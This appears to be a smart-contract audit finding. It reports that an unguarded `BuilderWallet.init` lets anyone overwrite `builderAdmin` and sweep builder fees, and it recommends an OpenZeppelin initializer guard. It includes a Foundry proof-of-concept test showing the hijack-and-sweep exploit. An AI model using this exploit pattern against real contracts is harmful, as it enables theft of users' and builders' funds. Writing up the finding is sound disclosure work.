  "body": "## Finding description and impact\n\nsince there is no guards on `BuilderWallet.init`, anyone can call it and overwrite the `builderAdmin` address, which is used to guard `sweep` from being called by anyone. In practice, any builder fees accumulated in these wallets can be stolen because of that.\n\nBecause this vulnerability leads to consistent user / builder loss of funds, I think this qualifies as a *high* vuln\n\n## Recommended mitigation steps\n\nSince these contracts are meant to be deployed by a factory, I would recommend making these contracts inherit from OpenZeppelin's `Initializable` contract, then add `initializer()` modifier to the `init()` function.",
  "proof_of_concept": "```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.24;\n\nimport \"forge-std/Test.sol\";\n\nimport {MockERC20} from \"solmate/src/test/utils/mocks/MockERC20.sol\";\n\nimport {BuilderFactory, BuilderWallet} from \"@contracts/RiskEngine.sol\";\n\ncontract BuilderWalletPoC is Test {\n    function test_poc_builderWalletInitHijackAndSweep() public {\n        BuilderFactory factory = new BuilderFactory(address(this));\n\n        uint48 builderCode = 123;\n        address legitAdmin = address(0xB0B);\n        address walletAddr = factory.deployBuilder(builderCode, legitAdmin);\n        BuilderWallet wallet = BuilderWallet(walletAddr);\n\n        MockERC20 token = new MockERC20(\"Token\", \"TOK\", 18);\n        token.mint(walletAddr, 1e18);\n\n        address attacker = address(0xA11CE);\n\n        vm.prank(attacker);\n        wallet.init(attacker);\n        assertEq(wallet.builderAdmin(), attacker);\n\n        address receiver = address(0xBEEF);\n        vm.prank(attacker);\n        wallet.sweep(address(token), receiver);\n\n        assertEq(token.balanceOf(walletAddr), 0);\n        assertEq(token.balanceOf(receiver), 1e18);\n    }\n}\n```",
